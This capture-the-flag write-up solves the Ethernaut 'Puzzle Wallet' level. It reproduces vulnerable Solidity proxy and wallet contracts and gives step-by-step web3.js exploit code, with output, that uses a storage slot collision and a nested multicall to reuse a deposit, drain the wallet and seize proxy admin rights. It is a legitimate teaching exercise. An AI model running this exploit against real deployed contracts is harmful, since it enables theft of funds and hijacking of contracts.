# 24. Puzzle Wallet

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

  You'll need to hijack this wallet to become the admin of the proxy.


## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

## Vulnerability

Delegate calls must be handled with care, as the contract making use of this trust the callee to do anything it wants with its storage.
Basically, when we make a call to the proxy, it will be delegated to the implementation. This delegation means that the code of the implementation will run in the context of the proxy.

### Taking ownership of the wallet

We can see that the wallet stores its `owner` variable in slot 0. However, in the context of the proxy slot 0 is used for the variable `pendingAdmin` which can be modified without restrictions by calling `proposeNewAdmin`, effectively modifying the owner for the code of PuzzleWallet.


```js
const accounts = await web3.eth.getAccounts();

// Encodes a call to proposeNewAdmin (belonging to the proxy)
const callData = web3.eth.abi.encodeFunctionCall({name: "proposeNewAdmin", type:'function', inputs:[{type:'address', name:'_newAdmin'}]}, [accounts[0]]);

// Send the tx to the proxy to overwrite slot 0 with our own address
await web3.eth.sendTransaction({to: contract.address, from: accounts[0], data: callData});
```

From now on we are considered as owner of the wallet. We can whitelist ourself :

```js
await contract.addToWhitelist(accounts[0]);
```

We now have full access to the Wallet functionalities as we are both owner and whitelisted. 

### Taking ownership of the proxy

In order to take ownership of the proxy we need to rewrite slot 1 from the Wallet. This slot hold the variable `maxBalance` which we cannot modify directly as :

```solidity
    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }
```

Will fail since maxBalance is already non 0.

```solidity
  function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }
```
Could work if we manage to drain all the funds of the proxy contract.

```js
await web3.eth.getBalance(contract.address);
// '1000000000000000000' or 1 ETH
```

**It took me a long time to figure out that I was going the wrong way...** the vulnerability to exploit is that the `multicall` function is not protected against reentrency.
So we can make a call to multicall that will deposit and call multicall again to deposit one more time and so on, all of that with a single tx, effectively reusing `msg.value`.

So let's first generate a call to deposit :

```js
const depositCall = web3.eth.abi.encodeFunctionCall({name: "deposit", type:'function', inputs:[]}, []);
```

Now let's generate a multicall that calls deposit :

```js
const innerMulticall = web3.eth.abi.encodeFunctionCall({name: 'multicall', type:'function', inputs:[{type:'bytes[]', name:'data'}]}, [[depositCall]]);
```

Finally, we generate a call that calls deposit followed by `innerMultiCall` (a call to multicall that calls deposit) :

```js
const outerMulticall = web3.eth.abi.encodeFunctionCall({name: 'multicall', type:'function', inputs:[{type:'bytes[]', name:'data'}]}, [[depositCall, innerMulticall]])
```

We can send those nested calls through a simple tx. Remember that the contract currently holds 1 ETH and we are planning on making 2 calls to deposit, thus reusing `msg.value` once. Our `msg.value` will be counted twice, and we want that `2 * msg.value` to equal to balance of the contract, therefore, we must send 1 ETH.

```js
await web3.eth.sendTransaction({from: accounts[0], to: contract.address, data:outerMulticall, value: web3.utils.toWei("1", "ether")})
```

We can check that our balance is actually twice what we deposited :

```js
(await contract.balances(accounts[0])).toString();
// '2000000000000000000' or 2 ETH
```

It is also matching the balance of the proxy contract :

```js
await web3.eth.getBalance(contract.address);
// '2000000000000000000' or 2 ETH
```

So we can now spend that money, and we will be able to rewrite `maxBalance`.

```js
const balance = await contract.balances(accounts[0]);

// Send the 2 ETH back to ourself
await contract.execute(accounts[0], balance, []);
```

The proxy contract should now have a balance of 0 :

```js
await web3.eth.getBalance(contract.address);
// '0'
```

Finally, we can overwrite `maxBalance` to our address. As `maxBalance` is bound to storage slot 1, which is also the slot of `admin` for the proxy contract we will become admin of the proxy.

```js
await contract.setMaxBalance(accounts[0]);
```

Just to make sure, let's read storage slot 1 of the proxy contract:

```js
await web3.eth.getStorageAt(contract.address, 1);
// '0x000000000000000000000000YOUR-ADDRESS-IS-HERE'
```

You can now submit the challenge !